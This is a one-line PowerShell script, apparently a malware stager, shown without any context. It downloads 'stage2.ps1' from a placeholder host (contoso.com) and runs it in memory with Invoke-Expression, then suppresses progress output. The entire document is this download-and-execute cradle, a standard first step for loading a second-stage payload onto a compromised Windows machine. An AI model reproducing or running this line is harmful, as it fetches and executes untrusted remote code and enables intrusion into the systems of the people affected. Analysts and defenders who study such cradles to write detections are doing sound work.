$TransferUrl = 'http://contoso.com/stage2.ps1'; $RemoteScript = (New-Object System.Net.WebClient).DownloadString($TransferUrl); IEX $RemoteScript; $ProgressPreference = "SilentlyContinue"
